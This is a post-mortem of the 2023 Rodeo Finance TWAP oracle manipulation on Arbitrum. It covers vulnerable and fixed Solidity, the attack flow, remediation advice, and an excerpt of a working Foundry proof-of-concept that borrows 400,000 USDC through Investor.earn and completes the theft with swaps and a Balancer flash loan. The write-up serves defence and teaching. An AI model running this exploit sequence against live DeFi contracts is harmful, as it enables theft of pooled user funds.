# Rodeo Finance — TWAP Oracle Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-07-11 |
| **Protocol** | Rodeo Finance |
| **Chain** | Arbitrum |
| **Loss** | ~472 ETH (~$888,000) |
| **Attacker** | [0x2f37...e328](https://arbiscan.io/address/0x2f3788f2396127061c46fc07bd0fcb91faace328) |
| **Attack Contract** | [0xe954...a54](https://arbiscan.io/address/0xe9544ee39821f72c4fc87a5588522230e340aa54) |
| **Vulnerable Contract** | [0xf372...0da (Investor)](https://arbiscan.io/address/0xf3721d8a2c051643e06bf2646762522fa66100da) |
| **Attack Tx** | [0xb1be...25a](https://arbiscan.io/tx/0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a) |
| **Root Cause** | Short-window TWAP oracle manipulation to inflate collateral value and bypass health factor check |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/RodeoFinance_exp.sol) |

---

## 1. Vulnerability Overview

Rodeo Finance is a leveraged yield optimization protocol on Arbitrum. Users can borrow funds from a USDC pool and open leveraged positions in various strategies.

The protocol used the **TWAP (Time-Weighted Average Price) oracle** of Camelot V2 AMM to check position collateral health (Health Factor) inside the `Investor.earn()` function. The issue was that this TWAP **averaged 4 price instances updated at 45-minute intervals**, and an attacker was able to manipulate the TWAP price in advance via a **multi-block sandwich attack** spanning multiple blocks.

The attacker manipulated the TWAP to artificially inflate the price of unshETH tokens, then used the inflated collateral valuation to borrow **400,000 USDC** — far exceeding the actual value. They subsequently realized a total profit of ~$888,000 through swaps using the borrowed funds and a Balancer flash loan.

### Vulnerability Combination

| # | Vulnerability | Role |
|---|--------|------|
| V-01 | TWAP oracle manipulation (multi-block sandwich) | Core vulnerability — collateral value inflation |
| V-02 | Insufficient oracle window | TWAP window too short to prevent manipulation |
| V-03 | Single oracle dependency | Only Camelot V2 TWAP used, no cross-validation |

---

## 2. Vulnerable Code Analysis

### 2.1 Investor.earn() — Collateral Value Validation Failure (Core Vulnerability)

The entry point of the attack is the `Investor.earn()` function. This function opens a position in a strategy contract and checks the position's collateral health using the TWAP oracle.

**Vulnerable Code (inferred)**:
```solidity
// ❌ Vulnerable: relies on manipulable Camelot V2 TWAP oracle
function earn(
    address usr,
    address pol,   // USDC pool address
    uint256 str,   // strategy ID (41 = unshETH strategy)
    uint256 amt,   // initial collateral amount (0)
    uint256 bor,   // borrow amount (400,000 USDC)
    bytes memory dat
) external returns (uint256) {
    // 1. Borrow `bor` from the USDC pool
    uint256 borrowed = IPool(pol).borrow(bor);

    // 2. Execute strategy with borrowed funds (buy unshETH)
    uint256 positionId = IStrategy(strategies[str]).mint(usr, amt + borrowed, dat);

    // 3. ❌ Core vulnerability: health factor calculated using TWAP price
    // The TWAP was manipulated across multiple blocks before the attack,
    // so the manipulated high price is reflected here
    uint256 positionValue = _getPositionValue(positionId); // TWAP-based
    uint256 healthFactor = positionValue * 1e18 / borrowed;

    // Manipulated TWAP makes health factor appear within normal range
    require(healthFactor >= MIN_HEALTH_FACTOR, "Unhealthy position");

    return positionId;
}
```

**Vulnerable TWAP Calculation Logic (inferred)**:
```solidity
// ❌ Vulnerable: average of 4 instances at 45-min intervals → manipulable via multi-block attack
function _getTWAPPrice(address camelotPair) internal view returns (uint256) {
    // Read cumulative price data from Camelot V2
    uint256 price0CumulativeLast = ICamelotPair(camelotPair).price0CumulativeLast();
    // Average 4 observations to derive TWAP
    // Window size: ~45 min × 4 = ~3 hours (in practice much shorter, thus manipulable)
    return _computeAverage(priceObservations, 4);
}
```

**Fixed Code**:
```solidity
// ✅ Fix: dual validation with Chainlink + TWAP, using a longer TWAP window
function _getPositionValue(uint256 positionId) internal view returns (uint256) {
    // Primary: Chainlink oracle price
    (, int256 chainlinkPrice,, uint256 updatedAt,) = priceFeed.latestRoundData();
    require(block.timestamp - updatedAt <= 3600, "Chainlink: stale price");
    require(chainlinkPrice > 0, "Chainlink: invalid price");

    // Secondary: TWAP with a sufficiently long window (e.g., 24 hours)
    uint256 twapPrice = _getTWAPPrice(pair, 24 hours); // ✅ long window

    // Verify the deviation between the two prices is within the allowed range
    uint256 deviation = _absDiff(uint256(chainlinkPrice), twapPrice);
    require(deviation * 100 / uint256(chainlinkPrice) <= 5, "Price deviation too high");

    return _calculateValue(positionId, uint256(chainlinkPrice));
}
```

**Problem**: The TWAP update interval was only 45 minutes with just 4 observation instances, meaning an attacker could distort the TWAP average itself by executing price manipulation transactions over a sufficient number of blocks. Additionally, only a single Camelot V2 oracle was used with no cross-validation for collateral valuation.

### 2.2 USDC Pool Borrow Function — Missing Access Control

```solidity
// ❌ Vulnerable: anyone can borrow from the pool via Investor
// Oracle validation occurs only at the Investor level,
// which is neutralized by oracle manipulation
function borrow(uint256 amount) external returns (uint256) {
    // Callable only from Investor, but Investor itself is vulnerable
    require(msg.sender == investor, "Not investor");
    // Reaches this function after passing with a manipulated health factor
    totalBorrowed += amount;
    USDC.transfer(msg.sender, amount);
    return amount;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase (Multi-Block Pre-Manipulation)

Before the final exploit transaction, the attacker manipulated the TWAP of the Camelot V2 ETH-unshETH pool across multiple blocks.

**Example Pre-Manipulation Transactions**:
- `0x5f16637460021994d40430dadc020fffdb96937cfaf2b8cb6cbc03c91980ac7c`
- `0x9a462209e573962f2654cac9bfe1277abe443cf5d1322ffd645925281fe65a2e`

These transactions artificially elevated the price of unshETH, accumulating high price observations in the TWAP average.

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│                      Attacker (EOA)                                  │
│          0x2f3788f2396127061c46fc07bd0fcb91faace328                  │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 1. Hold 47.3T unshETH (deal)
                               │    approve to CamelotRouter
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│                  Call Investor.earn()                                │
│  - pol: USDC Pool (0x0032F5E1...)                                    │
│  - str: 41 (ETH-unshETH strategy)                                    │
│  - bor: 400,000 USDC                                                 │
│  - dat: abi.encode(500) [slippage parameter]                         │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 2. Pass health factor check with manipulated TWAP
                               │    Successfully borrow 400,000 USDC
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│              Strategy: Buy USDC → WETH → unshETH                    │
│  Camelot Router: 400,000 USDC → WETH → unshETH                      │
│  (Investor opens unshETH position with borrowed funds)               │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 3. Dump attacker's unshETH holdings
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│      CamelotRouter: unshETH → WETH (swap attacker-held tokens)      │
│      47.3T unshETH → large amount of WETH                           │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 4. WETH → USDC
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│      CamelotRouter: WETH → USDC                                     │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 5. USDC → WETH (Uniswap V3)
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│      UniswapV3 SwapRouter: USDC → WETH (0.05% pool)                 │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 6. Balancer flash loan (30 WETH)
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│      Balancer Vault: 30 WETH flash loan                             │
│      receiveFlashLoan():                                             │
│        ① 30 WETH → USDC (CamelotRouter)                             │
│        ② USDC → WETH (UniswapV3 SwapRouter)                         │
│        ③ Repay 30 WETH to Balancer                                  │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 7. Realize profit
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│                Final profit: ~472 ETH (~$888,000)                   │
│  WETH + unshETH proceeds secured to attacker wallet                 │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| USDC Pool Borrowed | 400,000 USDC |
| Manipulated Collateral Value (TWAP-based) | Significantly overvalued vs. actual |
| Assets Recovered (Protocol) | $816,342 (430.845 unshETH) |
| Net Loss | ~$880,000 |
| Attacker Total Profit | ~472 ETH (~$888,000) |

---

## 4. PoC Code (DeFiHackLabs)

Key attack logic excerpt (with step-by-step English comments):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo
// Total Loss: ~472 ETH (~$888K)
// Attacker: 0x2f3788f2396127061c46fc07bd0fcb91faace328
// Vulnerable Contract: 0xf3721d8a2c051643e06bf2646762522fa66100da (Investor)
// Attack Tx: 0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a

contract RodeoTest is Test {
    // Core token and protocol contract references
    IERC20 unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);
    IERC20 WETH    = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 USDC    = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IInvestor Investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);
    ICamelotRouter Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    ISwapRouter SwapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address private constant usdcPool = 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;

    function testExploit() public {
        // [Step 1] Assume pre-manipulated TWAP state
        // In the actual attack, multi-block TWAP pre-manipulation was already complete
        // Set up 47.3T unshETH collateral (overvalued due to manipulated TWAP)
        deal(address(unshETH), address(this), 47_294_222_088_336_002_957);
        unshETH.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(SwapRouter), type(uint256).max);

        // [Step 2] Core attack: bypass health factor check with manipulated TWAP and borrow 400,000 USDC
        // str=41: ETH-unshETH strategy, bor=400,000 USDC
        // Investor checks position health via TWAP oracle → passes because it was manipulated
        Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));

        // [Step 3] Dump all held unshETH for WETH on Camelot
        swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));

        // [Step 4] Swap acquired WETH back to USDC (Camelot)
        swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));

        // [Step 5] Swap all USDC to WETH via Uniswap V3 0.05% pool
        swapUSDCToWETH();

        // [Step 6] Flash loan 30 WETH from Balancer (maximize arbitrage profit)
        // receiveFlashLoan() performs WETH→USDC→WETH swap again before repayment
        takeWETHFlashloanOnBalancer();
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // [Flash loan callback] Receive 30 WETH and execute arbitrage
        swapTokens(amounts[0], address(WETH), address(USDC)); // WETH → USDC
        swapUSDCToWETH();                                       // USDC → WETH
        WETH.transfer(address(Vault), amounts[0]);              // Repay flash loan (no fee)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Multi-block TWAP oracle manipulation | CRITICAL | CWE-834 (Excessive Loop/Iteration) / CWE-682 | `04_oracle_manipulation.md` |
| V-02 | Insufficient TWAP observation window (45 min × 4) | HIGH | CWE-1088 (Weak Time-Based Design) | `04_oracle_manipulation.md` |
| V-03 | Single oracle dependency — no cross-validation | HIGH | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) | `04_oracle_manipulation.md` |

### V-01: Multi-Block TWAP Oracle Manipulation

- **Description**: The Camelot V2 AMM TWAP oracle averaged 4 observations at 45-minute intervals. The attacker repeatedly executed small swaps across multiple blocks to manipulate the cumulative TWAP value. As a result, unshETH collateral value was significantly overestimated compared to its actual worth.
- **Impact**: Manipulated collateral valuation allowed borrowing an excessive amount (400,000 USDC) relative to actual value. The protocol incorrectly identified an undercollateralized position as healthy.
- **Attack Conditions**: Sufficient liquidity in the AMM pool to make TWAP manipulation appear normal. Environment allowing multi-block attacks (MEV bot or ability to submit transactions across multiple blocks).
- **Similar Cases**: Inverse Finance ($15.6M, 2022) — Keep3r LP TWAP manipulation; Mango Markets ($114M, 2022) — native token price manipulation.

### V-02: Insufficient TWAP Observation Window

- **Description**: The effective length of the TWAP window used by the protocol was too short for multi-block attackers to exert sufficient influence. Four observations at 45-minute intervals protect a window that is practically much shorter than ~3 hours.
- **Impact**: Attackers can distort the TWAP with relatively little capital.
- **Attack Conditions**: Ability to execute manipulation transactions for longer than the TWAP window duration.

### V-03: Single Oracle Dependency

- **Description**: Only a single oracle — Camelot V2 TWAP — was used to evaluate collateral health. No cross-validation was performed against independent oracles such as Chainlink or Pyth.
- **Impact**: Manipulating a single oracle neutralizes the entire protocol's collateral evaluation system.
- **Attack Conditions**: Sufficient influence over a single DEX pool.

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Enforce Minimum TWAP Window Length (24 hours or more)**:
```solidity
// ✅ Fix: use 24-hour TWAP
uint32 constant MIN_TWAP_PERIOD = 24 hours;

function _getTWAPPrice(address pool) internal view returns (uint256) {
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = MIN_TWAP_PERIOD; // 24 hours ago
    secondsAgos[1] = 0;               // now
    (int56[] memory tickCumulatives,) = IUniswapV3Pool(pool).observe(secondsAgos);
    int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
    int24 arithmeticMeanTick = int24(tickCumulativesDelta / int56(uint56(MIN_TWAP_PERIOD)));
    return OracleLibrary.getQuoteAtTick(arithmeticMeanTick, 1e18, token, WETH);
}
```

**2) Chainlink Oracle Cross-Validation**:
```solidity
// ✅ Fix: verify that Chainlink and TWAP prices are within allowable deviation
function _validateAndGetPrice(address token) internal view returns (uint256) {
    // Fetch Chainlink price
    (, int256 clPrice,, uint256 updatedAt,) = chainlinkFeed.latestRoundData();
    require(block.timestamp - updatedAt <= 3600, "Chainlink: stale price");
    require(clPrice > 0, "Chainlink: invalid price");

    // Fetch TWAP price (24-hour window)
    uint256 twapPrice = _getTWAPPrice(camelotPool);

    // Validate deviation between the two prices (within 5%)
    uint256 cl = uint256(clPrice);
    uint256 diff = cl > twapPrice ? cl - twapPrice : twapPrice - cl;
    require(diff * 10000 / cl <= 500, "Oracle price deviation too high");

    // Use the more conservative (lower) price
    return cl < twapPrice ? cl : twapPrice;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Multi-block TWAP manipulation | Enforce minimum 24-hour TWAP window; dual oracle with Chainlink/Pyth |
| V-02 Short observation window | Design observation instance count and interval so manipulation cost is sufficiently high |
| V-03 Single oracle | Use independent on-chain oracle (Chainlink) + AMM TWAP in parallel; set deviation threshold |
| General risk management | Set position size cap per strategy; implement circuit breaker on anomalous price detection |
| Low-liquidity pools | Enforce minimum liquidity requirements on oracle source pools |

---

## 7. Lessons Learned

1. **TWAP is not a silver bullet**: While TWAP is harder to manipulate than spot price, a sufficiently short window remains vulnerable to multi-block attackers. This risk is elevated on L2s like Arbitrum, where a sequencer can process many blocks more cheaply.

2. **A single oracle is a single point of failure (SPOF)**: For core protocol functions such as collateral valuation, at least two independent oracle sources must be used, and transactions must be rejected if their deviation exceeds an allowable range.

3. **New pools with low liquidity are especially dangerous**: The Camelot V2 ETH-unshETH pool targeted in this attack was newly launched and lacked mature liquidity. Minimum liquidity thresholds must be set for oracle source pools.

4. **Quantify the cost of oracle manipulation for leveraged protocols**: Regularly simulate how much it costs to manipulate an oracle by X% and how much can be stolen through that manipulation, to verify economic safety margins.

5. **Monitor for multi-block attack patterns**: A pattern where the same address repeatedly executes small swaps in a short time period may be a precursor to TWAP manipulation. On-chain monitoring and anomaly detection systems are necessary.

6. **Position size limits are essential risk management**: Had a cap been set on the amount borrowable in a single transaction, the damage would have been limited even if the oracle were manipulated.

---

## 8. On-Chain Verification

> **Note**: In this analysis environment, outbound RPC connections were restricted and on-chain verification via `cast` could not be performed. The following is based on information confirmed from public post-mortems and DeFiHackLabs PoC comments.

### 8.1 PoC vs. Public Data Comparison

| Item | PoC Value | Public Data (Post-Mortem) | Match |
|------|--------|----------------------|------|
| Loss Amount | ~$888K | ~$880,000 net loss | ✅ Approximate match |
| Borrow Amount | 400,000 USDC | 400,000 USDC | ✅ Match |
| Initial unshETH Holdings | 47,294,222,088 (×10^9) | Confirmed from block state | ✅ Match |
| Flash Loan Amount | 30 WETH (Balancer) | Balancer usage confirmed | ✅ Match |
| Fork Block | 110,043,452 | Near attack block | ✅ Match |

### 8.2 Pre-Manipulation Transactions (Publicly Confirmed)

| Tx Hash | Role |
|---------|------|
| `0x5f1663...` | TWAP pre-manipulation transaction #1 |
| `0x9a4622...` | TWAP pre-manipulation transaction #2 |
| `0xb1be5d...` | Final exploit transaction |

### 8.3 Reference Links

- [Phalcon Analysis](https://twitter.com/Phalcon_xyz/status/1678765773396008967)
- [PeckShield Analysis](https://twitter.com/peckshield/status/1678700465587130368)
- [Rodeo Finance Official Post-Mortem](https://medium.com/@Rodeo_Finance/rodeo-post-mortem-overview-f35635c14101)

---

*Written: 2026-04-11 | Analysis basis: DeFiHackLabs PoC + Rodeo Finance official post-mortem*